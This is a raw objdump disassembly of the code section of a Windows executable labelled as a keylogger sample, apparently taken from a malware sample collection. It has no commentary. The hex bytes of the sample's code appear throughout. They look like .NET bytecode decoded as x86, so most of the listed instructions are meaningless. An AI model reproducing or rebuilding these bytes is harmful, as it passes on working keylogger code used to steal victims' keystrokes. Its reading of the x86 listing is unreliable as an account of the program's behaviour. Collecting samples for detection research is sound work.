
malware_samples/keylogger/16beb1ae2de2974ccc2371d9f619f492295e590abb65d3102e362c8ec27f2bbb.exe:     file format pei-i386


Disassembly of section .text:

00402000 <.text>:
  402000:	48                   	dec    %eax
  402001:	00 00                	add    %al,(%eax)
  402003:	00 02                	add    %al,(%edx)
  402005:	00 05 00 10 27 00    	add    %al,0x271000
  40200b:	00 18                	add    %bl,(%eax)
  40200d:	16                   	push   %ss
  40200e:	00 00                	add    %al,(%eax)
  402010:	01 00                	add    %eax,(%eax)
  402012:	00 00                	add    %al,(%eax)
  402014:	01 00                	add    %eax,(%eax)
  402016:	00 06                	add    %al,(%esi)
  402018:	58                   	pop    %eax
  402019:	26 00 00             	add    %al,%es:(%eax)
  40201c:	b8 00 00 00 00       	mov    $0x0,%eax
	...
  402045:	00 00                	add    %al,(%eax)
  402047:	00 56 7e             	add    %dl,0x7e(%esi)
  40204a:	05 00 00 04 28       	add    $0x28040000,%eax
  40204f:	02 00                	add    (%eax),%al
  402051:	00 06                	add    %al,(%esi)
  402053:	80 06 00             	addb   $0x0,(%esi)
  402056:	00 04 28             	add    %al,(%eax,%ebp,1)
  402059:	01 00                	add    %eax,(%eax)
  40205b:	00 0a                	add    %cl,(%edx)
  40205d:	2a 00                	sub    (%eax),%al
  40205f:	00 1b                	add    %bl,(%ebx)
  402061:	30 07                	xor    %al,(%edi)
  402063:	00 32                	add    %dh,(%edx)
  402065:	00 00                	add    %al,(%eax)
  402067:	00 01                	add    %al,(%ecx)
  402069:	00 00                	add    %al,(%eax)
  40206b:	11 28                	adc    %ebp,(%eax)
  40206d:	02 00                	add    (%eax),%al
  40206f:	00 0a                	add    %cl,(%edx)
  402071:	0a 7e 07             	or     0x7(%esi),%bh
  402074:	00 00                	add    %al,(%eax)
  402076:	04 02                	add    $0x2,%al
  402078:	06                   	push   %es
  402079:	6f                   	outsl  %ds:(%esi),(%dx)
  40207a:	03 00                	add    (%eax),%eax
  40207c:	00 0a                	add    %cl,(%edx)
  40207e:	28 09                	sub    %cl,(%ecx)
  402080:	00 00                	add    %al,(%eax)
  402082:	06                   	push   %es
  402083:	16                   	push   %ss
  402084:	28 06                	sub    %al,(%esi)
  402086:	00 00                	add    %al,(%eax)
  402088:	06                   	push   %es
  402089:	0b dd                	or     %ebp,%ebx
  40208b:	0d 00 00 00 06       	or     $0x6000000,%eax
  402090:	39 06                	cmp    %eax,(%esi)
  402092:	00 00                	add    %al,(%eax)
  402094:	00 06                	add    %al,(%esi)
  402096:	6f                   	outsl  %ds:(%esi),(%dx)
  402097:	04 00                	add    $0x0,%al
  402099:	00 0a                	add    %cl,(%edx)
  40209b:	dc 07                	faddl  (%edi)
  40209d:	2a 00                	sub    (%eax),%al
  40209f:	00 01                	add    %al,(%ecx)
  4020a1:	10 00                	adc    %al,(%eax)
  4020a3:	00 02                	add    %al,(%edx)
  4020a5:	00 06                	add    %al,(%esi)
  4020a7:	00 1d 23 00 0d 00    	add    %bl,0xd0023
  4020ad:	00 00                	add    %al,(%eax)
  4020af:	00 1b                	add    %bl,(%ebx)
  4020b1:	30 10                	xor    %dl,(%eax)
  4020b3:	00 8a 03 00 00 02    	add    %cl,0x2000003(%edx)
  4020b9:	00 00                	add    %al,(%eax)
  4020bb:	11 02                	adc    %eax,(%edx)
  4020bd:	16                   	push   %ss
  4020be:	3f                   	aas
  4020bf:	75 03                	jne    0x4020c4
  4020c1:	00 00                	add    %al,(%eax)
  4020c3:	03 20                	add    (%eax),%esp
  4020c5:	00 01                	add    %al,(%ecx)
  4020c7:	00 00                	add    %al,(%eax)
  4020c9:	28 05 00 00 0a 28    	sub    %al,0x280a0000
  4020cf:	06                   	push   %es
  4020d0:	00 00                	add    %al,(%eax)
  4020d2:	0a 39                	or     (%ecx),%bh
  4020d4:	60                   	pusha
  4020d5:	03 00                	add    (%eax),%eax
  4020d7:	00 04 28             	add    %al,(%eax,%ebp,1)
  4020da:	07                   	pop    %es
  4020db:	00 00                	add    %al,(%eax)
  4020dd:	0a 0a                	or     (%edx),%cl
  4020df:	1f                   	pop    %ds
  4020e0:	14 28                	adc    $0x28,%al
  4020e2:	0c 00                	or     $0x0,%al
  4020e4:	00 06                	add    %al,(%esi)
  4020e6:	20 ff                	and    %bh,%bh
  4020e8:	ff 00                	incl   (%eax)
  4020ea:	00 5f 16             	add    %bl,0x16(%edi)
  4020ed:	fe 03                	incb   (%ebx)
  4020ef:	0b 20                	or     (%eax),%esp
  4020f1:	a0 00 00 00 28       	mov    0x28000000,%al
  4020f6:	0c 00                	or     $0x0,%al
  4020f8:	00 06                	add    %al,(%esi)
  4020fa:	20 00                	and    %al,(%eax)
  4020fc:	80 00 00             	addb   $0x0,(%eax)
  4020ff:	5f                   	pop    %edi
  402100:	3a 18                	cmp    (%eax),%bl
  402102:	00 00                	add    %al,(%eax)
  402104:	00 20                	add    %ah,(%eax)
  402106:	a1 00 00 00 28       	mov    0x28000000,%eax
  40210b:	0c 00                	or     $0x0,%al
  40210d:	00 06                	add    %al,(%esi)
  40210f:	20 00                	and    %al,(%eax)
  402111:	80 00 00             	addb   $0x0,(%eax)
  402114:	5f                   	pop    %edi
  402115:	16                   	push   %ss
  402116:	fe 03                	incb   (%ebx)
  402118:	38 01                	cmp    %al,(%ecx)
  40211a:	00 00                	add    %al,(%eax)
  40211c:	00 17                	add    %dl,(%edi)
  40211e:	0c 06                	or     $0x6,%al
  402120:	28 04 00             	sub    %al,(%eax,%eax,1)
  402123:	00 06                	add    %al,(%esi)
  402125:	0d 07 08 60 39       	or     $0x39600807,%eax
  40212a:	0c 00                	or     $0x0,%al
  40212c:	00 00                	add    %al,(%eax)
  40212e:	09 6f 08             	or     %ebp,0x8(%edi)
  402131:	00 00                	add    %al,(%eax)
  402133:	0a 0d 38 07 00 00    	or     0x738,%cl
  402139:	00 09                	add    %cl,(%ecx)
  40213b:	6f                   	outsl  %ds:(%esi),(%dx)
  40213c:	09 00                	or     %eax,(%eax)
  40213e:	00 0a                	add    %cl,(%edx)
  402140:	0d 06 1f 70 3f       	or     $0x3f701f06,%eax
  402145:	30 00                	xor    %al,(%eax)
  402147:	00 00                	add    %al,(%eax)
  402149:	06                   	push   %es
  40214a:	20 87 00 00 00 3d    	and    %al,0x3d000000(%edi)
  402150:	25 00 00 00 72       	and    $0x72000000,%eax
  402155:	01 00                	add    %eax,(%eax)
  402157:	00 70 06             	add    %dh,0x6(%eax)
  40215a:	13 04 12             	adc    (%edx,%edx,1),%eax
  40215d:	04 fe                	add    $0xfe,%al
  40215f:	16                   	push   %ss
  402160:	06                   	push   %es
  402161:	00 00                	add    %al,(%eax)
  402163:	01 6f 0a             	add    %ebp,0xa(%edi)
  402166:	00 00                	add    %al,(%eax)
  402168:	0a 72 05             	or     0x5(%edx),%dh
  40216b:	00 00                	add    %al,(%eax)
  40216d:	70 28                	jo     0x402197
  40216f:	0b 00                	or     (%eax),%eax
  402171:	00 0a                	add    %cl,(%edx)
  402173:	0d 38 4e 02 00       	or     $0x24e38,%eax
  402178:	00 06                	add    %al,(%esi)
  40217a:	13 04 12             	adc    (%edx,%edx,1),%eax
  40217d:	04 fe                	add    $0xfe,%al
  40217f:	16                   	push   %ss
  402180:	06                   	push   %es
  402181:	00 00                	add    %al,(%eax)
  402183:	01 6f 0a             	add    %ebp,0xa(%edi)
  402186:	00 00                	add    %al,(%eax)
  402188:	0a 13                	or     (%ebx),%dl
  40218a:	05 11 05 28 19       	add    $0x19280511,%eax
  40218f:	00 00                	add    %al,(%eax)
  402191:	06                   	push   %es
  402192:	13 06                	adc    (%esi),%eax
  402194:	11 06                	adc    %eax,(%esi)
  402196:	20 25 32 c4 c1 42    	and    %ah,0x42c1c432
  40219c:	52                   	push   %edx
  40219d:	00 00                	add    %al,(%eax)
  40219f:	00 11                	add    %dl,(%ecx)
  4021a1:	06                   	push   %es
  4021a2:	20 6b 6d             	and    %ch,0x6d(%ebx)
  4021a5:	ac                   	lods   %ds:(%esi),%al
  4021a6:	1d 42 1d 00 00       	sbb    $0x1d42,%eax
  4021ab:	00 11                	add    %dl,(%ecx)
  4021ad:	06                   	push   %es
  4021ae:	20 4b a6             	and    %cl,-0x5a(%ebx)
  4021b1:	ca 11 3b             	lret   $0x3b11
  4021b4:	74 01                	je     0x4021b7
  4021b6:	00 00                	add    %al,(%eax)
  4021b8:	11 06                	adc    %eax,(%esi)
  4021ba:	20 6b 6d             	and    %ch,0x6d(%ebx)
  4021bd:	ac                   	lods   %ds:(%esi),%al
  4021be:	1d 3b ce 00 00       	sbb    $0xce3b,%eax
  4021c3:	00 38                	add    %bh,(%eax)
  4021c5:	fe 01                	incb   (%ecx)
  4021c7:	00 00                	add    %al,(%eax)
  4021c9:	11 06                	adc    %eax,(%esi)
  4021cb:	20 ab ee 9a 20 3b    	and    %ch,0x3b209aee(%ebx)
  4021d1:	2b 01                	sub    (%ecx),%eax
  4021d3:	00 00                	add    %al,(%eax)
  4021d5:	11 06                	adc    %eax,(%esi)
  4021d7:	20 26                	and    %ah,(%esi)
  4021d9:	72 bb                	jb     0x402196
  4021db:	b7 3b                	mov    $0x3b,%bh
  4021dd:	9b                   	fwait
  4021de:	00 00                	add    %al,(%eax)
  4021e0:	00 11                	add    %dl,(%ecx)
  4021e2:	06                   	push   %es
  4021e3:	20 25 32 c4 c1 3b    	and    %ah,0x3bc1c432
  4021e9:	63 00                	arpl   %eax,(%eax)
  4021eb:	00 00                	add    %al,(%eax)
  4021ed:	38 d5                	cmp    %dl,%ch
  4021ef:	01 00                	add    %eax,(%eax)
  4021f1:	00 11                	add    %dl,(%ecx)
  4021f3:	06                   	push   %es
  4021f4:	20 ce                	and    %cl,%dh
  4021f6:	1d d6 e3 42 29       	sbb    $0x2942e3d6,%eax
  4021fb:	00 00                	add    %al,(%eax)
  4021fd:	00 11                	add    %dl,(%ecx)
  4021ff:	06                   	push   %es
  402200:	20 c2                	and    %al,%dl
  402202:	4b                   	dec    %ebx
  402203:	95                   	xchg   %eax,%ebp
  402204:	c2 3b e0             	ret    $0xe03b
  402207:	00 00                	add    %al,(%eax)
  402209:	00 11                	add    %dl,(%ecx)
  40220b:	06                   	push   %es
  40220c:	20 df                	and    %bl,%bh
  40220e:	b1 01                	mov    $0x1,%cl
  402210:	cc                   	int3
  402211:	3b 50 00             	cmp    0x0(%eax),%edx
  402214:	00 00                	add    %al,(%eax)
  402216:	11 06                	adc    %eax,(%esi)
  402218:	20 ce                	and    %cl,%dh
  40221a:	1d d6 e3 3b 9c       	sbb    $0x9c3be3d6,%eax
  40221f:	00 00                	add    %al,(%eax)
  402221:	00 38                	add    %bh,(%eax)
  402223:	a0 01 00 00 11       	mov    0x11000001,%al
  402228:	06                   	push   %es
  402229:	20 95 ac b0 eb 3b    	and    %dl,0x3bebb0ac(%ebp)
  40222f:	75 00                	jne    0x402231
  402231:	00 00                	add    %al,(%eax)
  402233:	11 06                	adc    %eax,(%esi)
  402235:	20 d0                	and    %dl,%al
  402237:	a2 64 f5 3b 95       	mov    %al,0x953bf564
  40223c:	00 00                	add    %al,(%eax)
  40223e:	00 11                	add    %dl,(%ecx)
  402240:	06                   	push   %es
  402241:	20 ec                	and    %ch,%ah
  402243:	58                   	pop    %eax
  402244:	83 fb 3b             	cmp    $0x3b,%ebx
  402247:	cb                   	lret
  402248:	00 00                	add    %al,(%eax)
  40224a:	00 38                	add    %bh,(%eax)
  40224c:	77 01                	ja     0x40224f
  40224e:	00 00                	add    %al,(%eax)
  402250:	11 05 72 09 00 00    	adc    %eax,0x972
  402256:	70 28                	jo     0x402280
  402258:	0c 00                	or     $0x0,%al
  40225a:	00 0a                	add    %cl,(%edx)
  40225c:	3a e1                	cmp    %cl,%ah
  40225e:	00 00                	add    %al,(%eax)
  402260:	00 38                	add    %bh,(%eax)
  402262:	61                   	popa
  402263:	01 00                	add    %eax,(%eax)
  402265:	00 11                	add    %dl,(%ecx)
  402267:	05 72 15 00 00       	add    $0x1572,%eax
  40226c:	70 28                	jo     0x402296
  40226e:	0c 00                	or     $0x0,%al
  402270:	00 0a                	add    %cl,(%edx)
  402272:	3a d6                	cmp    %dh,%dl
  402274:	00 00                	add    %al,(%eax)
  402276:	00 38                	add    %bh,(%eax)
  402278:	4b                   	dec    %ebx
  402279:	01 00                	add    %eax,(%eax)
  40227b:	00 11                	add    %dl,(%ecx)
  40227d:	05 72 23 00 00       	add    $0x2372,%eax
  402282:	70 28                	jo     0x4022ac
  402284:	0c 00                	or     $0x0,%al
  402286:	00 0a                	add    %cl,(%edx)
  402288:	3a cb                	cmp    %bl,%cl
  40228a:	00 00                	add    %al,(%eax)
  40228c:	00 38                	add    %bh,(%eax)
  40228e:	35 01 00 00 11       	xor    $0x11000001,%eax
  402293:	05 72 31 00 00       	add    $0x3172,%eax
  402298:	70 28                	jo     0x4022c2
  40229a:	0c 00                	or     $0x0,%al
  40229c:	00 0a                	add    %cl,(%edx)
  40229e:	3a c0                	cmp    %al,%al
  4022a0:	00 00                	add    %al,(%eax)
  4022a2:	00 38                	add    %bh,(%eax)
  4022a4:	1f                   	pop    %ds
  4022a5:	01 00                	add    %eax,(%eax)
  4022a7:	00 11                	add    %dl,(%ecx)
  4022a9:	05 72 49 00 00       	add    $0x4972,%eax
  4022ae:	70 28                	jo     0x4022d8
  4022b0:	0c 00                	or     $0x0,%al
  4022b2:	00 0a                	add    %cl,(%edx)
  4022b4:	3a b5 00 00 00 38    	cmp    0x38000000(%ebp),%dh
  4022ba:	09 01                	or     %eax,(%ecx)
  4022bc:	00 00                	add    %al,(%eax)
  4022be:	11 05 72 61 00 00    	adc    %eax,0x6172
  4022c4:	70 28                	jo     0x4022ee
  4022c6:	0c 00                	or     $0x0,%al
  4022c8:	00 0a                	add    %cl,(%edx)
  4022ca:	3a aa 00 00 00 38    	cmp    0x38000000(%edx),%ch
  4022d0:	f3 00 00             	repz add %al,(%eax)
  4022d3:	00 11                	add    %dl,(%ecx)
  4022d5:	05 72 75 00 00       	add    $0x7572,%eax
  4022da:	70 28                	jo     0x402304
  4022dc:	0c 00                	or     $0x0,%al
  4022de:	00 0a                	add    %cl,(%edx)
  4022e0:	3a 9f 00 00 00 38    	cmp    0x38000000(%edi),%bl
  4022e6:	dd 00                	fldl   (%eax)
  4022e8:	00 00                	add    %al,(%eax)
  4022ea:	11 05 72 89 00 00    	adc    %eax,0x8972
  4022f0:	70 28                	jo     0x40231a
  4022f2:	0c 00                	or     $0x0,%al
  4022f4:	00 0a                	add    %cl,(%edx)
  4022f6:	3a 94 00 00 00 38 c7 	cmp    -0x38c80000(%eax,%eax,1),%dl
  4022fd:	00 00                	add    %al,(%eax)
  4022ff:	00 11                	add    %dl,(%ecx)
  402301:	05 72 93 00 00       	add    $0x9372,%eax
  402306:	70 28                	jo     0x402330
  402308:	0c 00                	or     $0x0,%al
  40230a:	00 0a                	add    %cl,(%edx)
  40230c:	3a 89 00 00 00 38    	cmp    0x38000000(%ecx),%cl
  402312:	b1 00                	mov    $0x0,%cl
  402314:	00 00                	add    %al,(%eax)
  402316:	11 05 72 9d 00 00    	adc    %eax,0x9d72
  40231c:	70 28                	jo     0x402346
  40231e:	0c 00                	or     $0x0,%al
  402320:	00 0a                	add    %cl,(%edx)
  402322:	3a 7e 00             	cmp    0x0(%esi),%bh
  402325:	00 00                	add    %al,(%eax)
  402327:	38 9b 00 00 00 11    	cmp    %bl,0x11000000(%ebx)
  40232d:	05 72 a5 00 00       	add    $0xa572,%eax
  402332:	70 28                	jo     0x40235c
  402334:	0c 00                	or     $0x0,%al
  402336:	00 0a                	add    %cl,(%edx)
  402338:	3a 73 00             	cmp    0x0(%ebx),%dh
  40233b:	00 00                	add    %al,(%eax)
  40233d:	38 85 00 00 00 72    	cmp    %al,0x72000000(%ebp)
  402343:	b5 00                	mov    $0x0,%ch
  402345:	00 70 0d             	add    %dh,0xd(%eax)
  402348:	38 7a 00             	cmp    %bh,0x0(%edx)
  40234b:	00 00                	add    %al,(%eax)
  40234d:	72 c5                	jb     0x402314
  40234f:	00 00                	add    %al,(%eax)
  402351:	70 0d                	jo     0x402360
  402353:	38 6f 00             	cmp    %ch,0x0(%edi)
  402356:	00 00                	add    %al,(%eax)
  402358:	72 d5                	jb     0x40232f
  40235a:	00 00                	add    %al,(%eax)
  40235c:	70 0d                	jo     0x40236b
  40235e:	38 64 00 00          	cmp    %ah,0x0(%eax,%eax,1)
  402362:	00 72 e1             	add    %dh,-0x1f(%edx)
  402365:	00 00                	add    %al,(%eax)
  402367:	70 0d                	jo     0x402376
  402369:	38 59 00             	cmp    %bl,0x0(%ecx)
  40236c:	00 00                	add    %al,(%eax)
  40236e:	72 e1                	jb     0x402351
  402370:	00 00                	add    %al,(%eax)
  402372:	70 0d                	jo     0x402381
  402374:	38 4e 00             	cmp    %cl,0x0(%esi)
  402377:	00 00                	add    %al,(%eax)
  402379:	72 ef                	jb     0x40236a
  40237b:	00 00                	add    %al,(%eax)
  40237d:	70 0d                	jo     0x40238c
  40237f:	38 43 00             	cmp    %al,0x0(%ebx)
  402382:	00 00                	add    %al,(%eax)
  402384:	72 ef                	jb     0x402375
  402386:	00 00                	add    %al,(%eax)
  402388:	70 0d                	jo     0x402397
  40238a:	38 38                	cmp    %bh,(%eax)
  40238c:	00 00                	add    %al,(%eax)
  40238e:	00 72 ff             	add    %dh,-0x1(%edx)
  402391:	00 00                	add    %al,(%eax)
  402393:	70 0d                	jo     0x4023a2
  402395:	38 2d 00 00 00 72    	cmp    %ch,0x72000000
  40239b:	0d 01 00 70 0d       	or     $0xd700001,%eax
  4023a0:	38 22                	cmp    %ah,(%edx)
  4023a2:	00 00                	add    %al,(%eax)
  4023a4:	00 72 19             	add    %dh,0x19(%edx)
  4023a7:	01 00                	add    %eax,(%eax)
  4023a9:	70 0d                	jo     0x4023b8
  4023ab:	38 17                	cmp    %dl,(%edi)
  4023ad:	00 00                	add    %al,(%eax)
  4023af:	00 07                	add    %al,(%edi)
  4023b1:	39 0b                	cmp    %ecx,(%ebx)
  4023b3:	00 00                	add    %al,(%eax)
  4023b5:	00 72 25             	add    %dh,0x25(%edx)
  4023b8:	01 00                	add    %eax,(%eax)
  4023ba:	70 0d                	jo     0x4023c9
  4023bc:	38 06                	cmp    %al,(%esi)
  4023be:	00 00                	add    %al,(%eax)
  4023c0:	00 72 45             	add    %dh,0x45(%edx)
  4023c3:	01 00                	add    %eax,(%eax)
  4023c5:	70 0d                	jo     0x4023d4
  4023c7:	7e 02                	jle    0x4023cb
  4023c9:	00 00                	add    %al,(%eax)
  4023cb:	04 17                	add    $0x17,%al
  4023cd:	73 0d                	jae    0x4023dc
  4023cf:	00 00                	add    %al,(%eax)
  4023d1:	0a 13                	or     (%ebx),%dl
  4023d3:	07                   	pop    %es
  4023d4:	7e 03                	jle    0x4023d9
  4023d6:	00 00                	add    %al,(%eax)
  4023d8:	04 28                	add    $0x28,%al
  4023da:	05 00 00 06 28       	add    $0x28060000,%eax
  4023df:	0c 00                	or     $0x0,%al
  4023e1:	00 0a                	add    %cl,(%edx)
  4023e3:	39 0d 00 00 00 11    	cmp    %ecx,0x11000000
  4023e9:	07                   	pop    %es
  4023ea:	09 6f 0e             	or     %ebp,0xe(%edi)
  4023ed:	00 00                	add    %al,(%eax)
  4023ef:	0a dd                	or     %ch,%bl
  4023f1:	43                   	inc    %ebx
  4023f2:	00 00                	add    %al,(%eax)
  4023f4:	00 11                	add    %dl,(%ecx)
  4023f6:	07                   	pop    %es
  4023f7:	28 0f                	sub    %cl,(%edi)
  4023f9:	00 00                	add    %al,(%eax)
  4023fb:	0a 6f 10             	or     0x10(%edi),%ch
  4023fe:	00 00                	add    %al,(%eax)
  402400:	0a 11                	or     (%ecx),%dl
  402402:	07                   	pop    %es
  402403:	72 63                	jb     0x402468
  402405:	01 00                	add    %eax,(%eax)
  402407:	70 28                	jo     0x402431
  402409:	05 00 00 06 72       	add    $0x72060000,%eax
  40240e:	6f                   	outsl  %ds:(%esi),(%dx)
  40240f:	01 00                	add    %eax,(%eax)
  402411:	70 28                	jo     0x40243b
  402413:	0b 00                	or     (%eax),%eax
  402415:	00 0a                	add    %cl,(%edx)
  402417:	6f                   	outsl  %ds:(%esi),(%dx)
  402418:	10 00                	adc    %al,(%eax)
  40241a:	00 0a                	add    %cl,(%edx)
  40241c:	11 07                	adc    %eax,(%edi)
  40241e:	09 6f 0e             	or     %ebp,0xe(%edi)
  402421:	00 00                	add    %al,(%eax)
  402423:	0a dd                	or     %ch,%bl
  402425:	0f 00 00             	sldt   (%eax)
  402428:	00 11                	add    %dl,(%ecx)
  40242a:	07                   	pop    %es
  40242b:	39 07                	cmp    %eax,(%edi)
  40242d:	00 00                	add    %al,(%eax)
  40242f:	00 11                	add    %dl,(%ecx)
  402431:	07                   	pop    %es
  402432:	6f                   	outsl  %ds:(%esi),(%dx)
  402433:	04 00                	add    $0x0,%al
  402435:	00 0a                	add    %cl,(%edx)
  402437:	dc 7e 06             	fdivrl 0x6(%esi)
  40243a:	00 00                	add    %al,(%eax)
  40243c:	04 02                	add    $0x2,%al
  40243e:	03 04 28             	add    (%eax,%ebp,1),%eax
  402441:	08 00                	or     %al,(%eax)
  402443:	00 06                	add    %al,(%esi)
  402445:	2a 00                	sub    (%eax),%al
  402447:	00 01                	add    %al,(%ecx)
  402449:	10 00                	adc    %al,(%eax)
  40244b:	00 02                	add    %al,(%edx)
  40244d:	00 18                	add    %bl,(%eax)
  40244f:	03 55 6d             	add    0x6d(%ebp),%edx
  402452:	03 0f                	add    (%edi),%ecx
  402454:	00 00                	add    %al,(%eax)
  402456:	00 00                	add    %al,(%eax)
  402458:	1b 30                	sbb    (%eax),%esi
  40245a:	09 00                	or     %eax,(%eax)
  40245c:	75 00                	jne    0x40245e
  40245e:	00 00                	add    %al,(%eax)
  402460:	03 00                	add    (%eax),%eax
  402462:	00 11                	add    %dl,(%ecx)
  402464:	73 11                	jae    0x402477
  402466:	00 00                	add    %al,(%eax)
  402468:	0a 0a                	or     (%edx),%cl
  40246a:	20 00                	and    %al,(%eax)
  40246c:	01 00                	add    %eax,(%eax)
  40246e:	00 8d 0b 00 00 01    	add    %cl,0x100000b(%ebp)
  402474:	0b 07                	or     (%edi),%eax
  402476:	28 0d 00 00 06 3a    	sub    %cl,0x3a060000
  40247c:	0b 00                	or     (%eax),%eax
  40247e:	00 00                	add    %al,(%eax)
  402480:	72 79                	jb     0x4024fb
  402482:	01 00                	add    %eax,(%eax)
  402484:	70 0c                	jo     0x402492
  402486:	dd 4c 00 00          	fisttpll 0x0(%eax,%eax,1)
  40248a:	00 02                	add    %al,(%edx)
  40248c:	16                   	push   %ss
  40248d:	28 10                	sub    %dl,(%eax)
  40248f:	00 00                	add    %al,(%eax)
  402491:	06                   	push   %es
  402492:	0d 28 0a 00 00       	or     $0xa28,%eax
  402497:	06                   	push   %es
  402498:	12 04 28             	adc    (%eax,%ebp,1),%al
  40249b:	0b 00                	or     (%eax),%eax
  40249d:	00 06                	add    %al,(%esi)
  40249f:	28 0e                	sub    %cl,(%esi)
  4024a1:	00 00                	add    %al,(%eax)
  4024a3:	06                   	push   %es
  4024a4:	13 05 02 09 07 06    	adc    0x6070902,%eax
  4024aa:	1b 16                	sbb    (%esi),%edx
  4024ac:	11 05 28 0f 00 00    	adc    %eax,0xf28
  4024b2:	06                   	push   %es
  4024b3:	26 06                	es push %es
  4024b5:	6f                   	outsl  %ds:(%esi),(%dx)
  4024b6:	0a 00                	or     (%eax),%al
  4024b8:	00 0a                	add    %cl,(%edx)
  4024ba:	0c dd                	or     $0xdd,%al
  4024bc:	17                   	pop    %ss
  4024bd:	00 00                	add    %al,(%eax)
  4024bf:	00 26                	add    %ah,(%esi)
  4024c1:	dd 00                	fldl   (%eax)
  4024c3:	00 00                	add    %al,(%eax)
  4024c5:	00 02                	add    %al,(%edx)
  4024c7:	13 06                	adc    (%esi),%eax
  4024c9:	12 06                	adc    (%esi),%al
  4024cb:	fe                   	(bad)
  4024cc:	16                   	push   %ss
  4024cd:	06                   	push   %es
  4024ce:	00 00                	add    %al,(%eax)
  4024d0:	01 6f 0a             	add    %ebp,0xa(%edi)
  4024d3:	00 00                	add    %al,(%eax)
  4024d5:	0a 2a                	or     (%edx),%ch
  4024d7:	08 2a                	or     %ch,(%edx)
  4024d9:	00 00                	add    %al,(%eax)
  4024db:	00 01                	add    %al,(%ecx)
  4024dd:	10 00                	adc    %al,(%eax)
  4024df:	00 00                	add    %al,(%eax)
  4024e1:	00 00                	add    %al,(%eax)
  4024e3:	00 5c 5c 00          	add    %bl,0x0(%esp,%ebx,2)
  4024e7:	06                   	push   %es
  4024e8:	02 00                	add    (%eax),%al
  4024ea:	00 01                	add    %al,(%ecx)
  4024ec:	1b 30                	sbb    (%eax),%esi
  4024ee:	04 00                	add    $0x0,%al
  4024f0:	48                   	dec    %eax
  4024f1:	00 00                	add    %al,(%eax)
  4024f3:	00 04 00             	add    %al,(%eax,%eax,1)
  4024f6:	00 11                	add    %dl,(%ecx)
  4024f8:	28 0a                	sub    %cl,(%edx)
  4024fa:	00 00                	add    %al,(%eax)
  4024fc:	06                   	push   %es
  4024fd:	12 00                	adc    (%eax),%al
  4024ff:	28 0b                	sub    %cl,(%ebx)
  402501:	00 00                	add    %al,(%eax)
  402503:	06                   	push   %es
  402504:	26 06                	es push %es
  402506:	28 12                	sub    %dl,(%edx)
  402508:	00 00                	add    %al,(%eax)
  40250a:	0a 0b                	or     (%ebx),%cl
  40250c:	07                   	pop    %es
  40250d:	6f                   	outsl  %ds:(%esi),(%dx)
  40250e:	13 00                	adc    (%eax),%eax
  402510:	00 0a                	add    %cl,(%edx)
  402512:	0c 08                	or     $0x8,%al
  402514:	28 14 00             	sub    %dl,(%eax,%eax,1)
  402517:	00 0a                	add    %cl,(%edx)
  402519:	39 07                	cmp    %eax,(%edi)
  40251b:	00 00                	add    %al,(%eax)
  40251d:	00 07                	add    %al,(%edi)
  40251f:	6f                   	outsl  %ds:(%esi),(%dx)
  402520:	03 00                	add    (%eax),%eax
  402522:	00 0a                	add    %cl,(%edx)
  402524:	0c 08                	or     $0x8,%al
  402526:	80 03 00             	addb   $0x0,(%ebx)
  402529:	00 04 08             	add    %al,(%eax,%ecx,1)
  40252c:	0d dd 0c 00 00       	or     $0xcdd,%eax
  402531:	00 26                	add    %ah,(%esi)
  402533:	72 7b                	jb     0x4025b0
  402535:	01 00                	add    %eax,(%eax)
  402537:	70 0d                	jo     0x402546
  402539:	dd 00                	fldl   (%eax)
  40253b:	00 00                	add    %al,(%eax)
  40253d:	00 09                	add    %cl,(%ecx)
  40253f:	2a 01                	sub    (%ecx),%al
  402541:	10 00                	adc    %al,(%eax)
  402543:	00 00                	add    %al,(%eax)
  402545:	00 00                	add    %al,(%eax)
  402547:	00 3a                	add    %bh,(%edx)
  402549:	3a 00                	cmp    (%eax),%al
  40254b:	0c 0c                	or     $0xc,%al
  40254d:	00 00                	add    %al,(%eax)
  40254f:	01 13                	add    %edx,(%ebx)
  402551:	30 02                	xor    %al,(%edx)
  402553:	00 43 00             	add    %al,0x0(%ebx)
  402556:	00 00                	add    %al,(%eax)
  402558:	00 00                	add    %al,(%eax)
  40255a:	00 00                	add    %al,(%eax)
  40255c:	1f                   	pop    %ds
  40255d:	1a 28                	sbb    (%eax),%ch
  40255f:	15 00 00 0a 80       	adc    $0x800a0000,%eax
  402564:	01 00                	add    %eax,(%eax)
  402566:	00 04 7e             	add    %al,(%esi,%edi,2)
  402569:	01 00                	add    %eax,(%eax)
  40256b:	00 04 72             	add    %al,(%edx,%esi,2)
  40256e:	83 01 00             	addl   $0x0,(%ecx)
  402571:	70 28                	jo     0x40259b
  402573:	16                   	push   %ss
  402574:	00 00                	add    %al,(%eax)
  402576:	0a 80 02 00 00 04    	or     0x4000002(%eax),%al
  40257c:	14 fe                	adc    $0xfe,%al
  40257e:	06                   	push   %es
  40257f:	03 00                	add    (%eax),%eax
  402581:	00 06                	add    %al,(%esi)
  402583:	73 1a                	jae    0x40259f
  402585:	00 00                	add    %al,(%eax)
  402587:	06                   	push   %es
  402588:	80 05 00 00 04 7e 17 	addb   $0x17,0x7e040000
  40258f:	00 00                	add    %al,(%eax)
  402591:	0a 80 06 00 00 04    	or     0x4000006(%eax),%al
  402597:	1f                   	pop    %ds
  402598:	0d 80 07 00 00       	or     $0x780,%eax
  40259d:	04 2a                	add    $0x2a,%al
  40259f:	00 01                	add    %al,(%ecx)
  4025a1:	04 00                	add    $0x0,%al
  4025a3:	00 1e                	add    %bl,(%esi)
  4025a5:	02 28                	add    (%eax),%ch
  4025a7:	18 00                	sbb    %al,(%eax)
  4025a9:	00 0a                	add    %cl,(%edx)
  4025ab:	2a ba 7e 08 00 00    	sub    0x87e(%edx),%bh
  4025b1:	04 3a                	add    $0x3a,%al
  4025b3:	1e                   	push   %ds
  4025b4:	00 00                	add    %al,(%eax)
  4025b6:	00 72 ad             	add    %dh,-0x53(%edx)
  4025b9:	01 00                	add    %eax,(%eax)
  4025bb:	70 d0                	jo     0x40258d
  4025bd:	03 00                	add    (%eax),%eax
  4025bf:	00 02                	add    %al,(%edx)
  4025c1:	28 19                	sub    %bl,(%ecx)
  4025c3:	00 00                	add    %al,(%eax)
  4025c5:	0a 6f 1a             	or     0x1a(%edi),%ch
  4025c8:	00 00                	add    %al,(%eax)
  4025ca:	0a 73 1b             	or     0x1b(%ebx),%dh
  4025cd:	00 00                	add    %al,(%eax)
  4025cf:	0a 80 08 00 00 04    	or     0x4000008(%eax),%al
  4025d5:	7e 08                	jle    0x4025df
  4025d7:	00 00                	add    %al,(%eax)
  4025d9:	04 2a                	add    $0x2a,%al
  4025db:	00 1a                	add    %bl,(%edx)
